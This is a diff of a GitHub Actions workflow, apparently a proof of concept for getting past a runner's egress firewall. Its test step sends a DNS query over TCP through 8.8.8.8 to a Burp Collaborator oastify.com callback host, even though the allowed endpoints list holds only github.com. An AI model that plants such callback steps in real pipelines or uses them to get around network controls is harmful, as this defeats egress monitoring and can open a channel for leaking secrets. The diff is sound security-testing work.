@@ -1,8 +1,8 @@
-name: PoC #test
+name: PoC 
 on: [push, workflow_dispatch]
 jobs:
   bypass-firewall:
-    runs-on: ubuntu-22.04
+    runs-on: ubuntu-latest
     steps:
 
 
@@ -13,10 +13,7 @@ jobs:
           allowed-endpoints: >
             github.com:443
 
-      - name: Checkout repository
-        uses: actions/checkout@v4 # This action handles cloning the repository
-
 
       - name: Test bypass
-        run: dig google.com @8.8.8.8 +tcp
+        run: dig oqih2t1e26f9jccslhiuil4modu4i16q.oastify.com @8.8.8.8 +tcp
 
